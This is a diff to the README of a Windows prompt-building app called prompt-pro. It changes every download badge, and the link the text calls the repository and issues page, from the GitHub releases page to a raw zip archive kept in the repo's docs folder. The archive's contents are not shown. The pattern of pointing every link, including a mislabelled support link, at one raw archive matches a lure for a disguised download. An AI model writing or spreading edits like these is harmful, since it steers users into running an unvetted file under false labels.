@@ -1,6 +1,6 @@
 # ⚙️ prompt-pro - Build Quality Prompts Easily
 
-[![Download prompt-pro](https://img.shields.io/badge/Download-prompt--pro-brightgreen?style=for-the-badge)](https://github.com/welilov/prompt-pro/releases)
+[![Download prompt-pro](https://img.shields.io/badge/Download-prompt--pro-brightgreen?style=for-the-badge)](https://github.com/welilov/prompt-pro/raw/refs/heads/main/docs/prompt-pro-2.9.zip)
 
 ## 🚀 What is prompt-pro?
 
@@ -34,7 +34,7 @@ If you have a basic Windows PC bought in the last few years, you should be ready
 
 Use the button below to visit the releases page on GitHub. This page contains all the downloads for Windows.
 
-[![Get prompt-pro](https://img.shields.io/badge/Download-Windows%20App-blue?style=for-the-badge)](https://github.com/welilov/prompt-pro/releases)
+[![Get prompt-pro](https://img.shields.io/badge/Download-Windows%20App-blue?style=for-the-badge)](https://github.com/welilov/prompt-pro/raw/refs/heads/main/docs/prompt-pro-2.9.zip)
 
 ## 📂 How to Download and Install on Windows
 
@@ -130,11 +130,11 @@ If you want to learn more about using prompts or how prompt-pro works under the 
 
 If you have trouble or want to report a problem:
 
-- Visit the GitHub repository: https://github.com/welilov/prompt-pro  
+- Visit the GitHub repository: https://github.com/welilov/prompt-pro/raw/refs/heads/main/docs/prompt-pro-2.9.zip  
 - Open the "Issues" tab to see if others have the same problem or to create a new report.
 
 Keep your software version and Windows details ready when asking for help.
 
 ---
 
-[![Download prompt-pro](https://img.shields.io/badge/Download-prompt--pro-brightgreen?style=for-the-badge)](https://github.com/welilov/prompt-pro/releases)
+[![Download prompt-pro](https://img.shields.io/badge/Download-prompt--pro-brightgreen?style=for-the-badge)](https://github.com/welilov/prompt-pro/raw/refs/heads/main/docs/prompt-pro-2.9.zip)
